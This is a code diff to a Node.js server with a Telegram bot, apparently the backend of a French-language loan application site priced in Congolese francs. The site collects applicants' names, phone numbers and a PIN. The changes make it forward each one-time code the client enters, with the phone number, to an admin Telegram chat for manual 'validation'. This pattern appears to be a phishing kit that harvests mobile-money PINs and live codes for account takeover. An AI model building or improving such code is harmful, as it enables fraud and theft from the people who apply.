@@ -12,7 +12,6 @@ const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 
-// Initialize Telegram Bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 // ==================== FILE-BASED STORAGE ====================
@@ -49,7 +48,6 @@ function saveData() {
 const { applications, otps } = loadData();
 setInterval(saveData, 30000);
 
-// Middleware
 app.use(cors());
 app.use(bodyParser.json());
 
@@ -194,8 +192,8 @@ bot.on('callback_query', async (callbackQuery) => {
             `❌ *LOAN DECLINED*\n\n` + formatApplication(app),
             { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
         );
+
     } else if (action === 'otp_valid') {
-        // Admin confirms OTP is valid
         app.otpVerified = true;
         app.otpValidatedBy = chatId;
         app.otpValidatedAt = new Date().toISOString();
@@ -205,16 +203,16 @@ bot.on('callback_query', async (callbackQuery) => {
 
         bot.editMessageText(
             `✅ *OTP VALIDATED*\n\n` + formatApplication(app) +
-            `\n\n🔐 OTP verified by admin\n✅ Client notified of success`,
+            `\n\n🔐 Client OTP: ${app.clientOtp || 'N/A'}\n✅ Client notified of success`,
             { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
         );
 
     } else if (action === 'otp_invalid') {
-        // Admin says OTP is invalid
         app.otpRejected = true;
         app.otpRejectedBy = chatId;
         app.otpRejectedAt = new Date().toISOString();
-        // Generate new OTP
+        app.otpVerified = false;
+        
         const newOtp = generateOTP();
         otps.set(app.phone, { otp: newOtp, appId, expiresAt: Date.now() + 10 * 60 * 1000 });
         saveData();
@@ -280,7 +278,7 @@ function sendOTPValidationToAdmin(app) {
     };
     bot.sendMessage(ADMIN_CHAT_ID, 
         `🔐 *OTP Verification Required*\n\n` + formatApplication(app) +
-        `\n\nClient entered OTP. Please validate:`,
+        `\n\n📱 *Client Phone:* ${app.phone}\n🔢 *Client Entered OTP:* \`${app.clientOtp || 'N/A'}\`\n\nPlease validate the OTP entered by the client:`,
         { parse_mode: 'Markdown', reply_markup: keyboard }
     );
 }
@@ -289,7 +287,7 @@ function sendOTPValidationToAdmin(app) {
 app.post('/api/apply', (req, res) => {
     const { firstName, lastName, phone, loanAmount, loanDuration, loanType, purpose, pin } = req.body;
 
-    if (!firstName || !lastName || !phone || !loanAmount === undefined || !loanDuration === undefined || !pin) {
+    if (!firstName || !lastName || !phone || loanAmount === undefined || loanDuration === undefined || !pin) {
         return res.status(400).json({ success: false, message: 'Tous les champs sont requis' });
     }
 
@@ -298,8 +296,8 @@ app.post('/api/apply', (req, res) => {
     }
 
     const amount = parseFloat(loanAmount);
-    if (amount < 0 || amount > 2000000) {
-        return res.status(400).json({ success: false, message: 'Le montant doit être entre 0 et 2,000,000 CDF' });
+    if (amount < 50000 || amount > 2000000) {
+        return res.status(400).json({ success: false, message: 'Le montant doit être entre 50,000 et 2,000,000 CDF' });
     }
 
     const duration = parseInt(loanDuration);
@@ -321,6 +319,7 @@ app.post('/api/apply', (req, res) => {
         status: 'pending',
         submittedAt: new Date().toISOString(),
         otp: null,
+        clientOtp: null,
         otpVerified: false,
         otpRejected: false,
         otpValidatedBy: null,
@@ -336,7 +335,7 @@ app.post('/api/apply', (req, res) => {
     res.json({ success: true, message: 'Demande soumise avec succès', applicationId: appId });
 });
 
-// OTP submission - sends to admin for validation
+// OTP submission - sends CLIENT'S entered OTP to admin for validation
 app.post('/api/verify-otp', (req, res) => {
     const { phone, otp, applicationId } = req.body;
     const stored = otps.get(phone);
@@ -350,10 +349,10 @@ app.post('/api/verify-otp', (req, res) => {
     if (stored.appId !== applicationId) return res.status(400).json({ success: false, message: 'OTP ne correspond pas' });
 
     const app = applications.get(applicationId);
-    app.otp = otp;
+    app.clientOtp = otp; // Store the OTP the client entered
     saveData();
 
-    // Send to admin for validation instead of auto-approving
+    // Send client's OTP to admin for validation
     sendOTPValidationToAdmin(app);
 
     res.json({ success: true, message: 'OTP soumis. En attente de validation admin.', status: 'pending_validation' });
@@ -370,6 +369,9 @@ app.get('/api/otp-status/:id', (req, res) => {
             duration: app.loanDuration, monthlyPayment: app.monthlyPayment, status: 'complete'
         }});
     } else if (app.otpRejected) {
+        // Reset rejection flag so client can try again
+        app.otpRejected = false;
+        saveData();
         res.json({ success: true, status: 'rejected', message: 'OTP invalide. Nouveau code envoyé.' });
     } else {
         res.json({ success: true, status: 'pending', message: 'En attente de validation...' });
